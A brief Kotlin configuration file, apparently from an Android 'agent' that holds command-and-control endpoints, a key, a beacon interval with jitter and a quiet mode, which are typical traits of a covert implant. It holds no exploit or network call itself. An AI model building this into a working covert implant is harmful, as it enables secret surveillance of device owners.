package com.pegasus.agent

import android.content.Context

object Config {
    var endpoints: List<String> = listOf(BuildConfig.ENDPOINT)
    var dna: String = BuildConfig.DNA
    var key: String = BuildConfig.KEY
    var beaconSeconds: Long = 300L
    var jitter: Double = 0.35
    var quiet: Boolean = false

    fun load(ctx: Context) {
        val p = ctx.getSharedPreferences("cfg", 0)
        endpoints = p.getString("endpoints", endpoints.joinToString("|"))!!.split("|")
        dna = p.getString("dna", dna)!!
        key = p.getString("key", key)!!
        beaconSeconds = p.getLong("beacon", beaconSeconds)
        quiet = p.getBoolean("quiet", false)
    }
}
